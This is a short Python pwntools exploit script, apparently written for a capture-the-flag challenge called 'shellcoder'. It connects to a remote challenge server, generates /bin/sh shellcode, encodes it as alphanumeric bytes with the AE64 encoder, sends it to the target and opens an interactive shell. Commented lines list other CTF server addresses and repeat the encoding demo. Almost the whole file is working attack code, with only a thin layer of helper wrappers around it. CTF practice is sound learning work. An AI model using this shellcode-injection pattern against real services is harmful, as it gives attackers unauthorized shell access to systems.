import time
from pwn import *
from LibcSearcher import *
from ctypes import *
from struct import pack
from ae64 import AE64

# io = remote("192.168.170.128", 9997)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 29323)
io = remote("node5.anna.nssctf.cn", 28878)
# io = process('./q2')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('./shellcoder')
# libc = ELF('./libc-2.23.so')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r():
    return (io.recv())
def ru(a):
    return io.recvuntil(a)
def rl():
    io.recvline()
def sla(a, b):
    io.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()
def print_addr(name, addr):
    print(f"{name} =", addr)


# context(os='linux', arch='amd64')
context(os='linux', arch='amd64', log_level="debug")

shellcode = asm(shellcraft.sh())
enc_shellcode = (AE64().encode(shellcode))
print(enc_shellcode)
s(enc_shellcode)

inter()

# # demo.py:
# from ae64 import AE64
# from dasctf_sixbytes import *
# context.arch='amd64'
#
# # get bytes format shellcode_0
# shellcode_0 = asm(shellcraft.sh())
#
# # get alphanumeric shellcode_0
# enc_shellcode = AE64().encode(shellcode_0)
# print(enc_shellcode.decode('latin-1'))
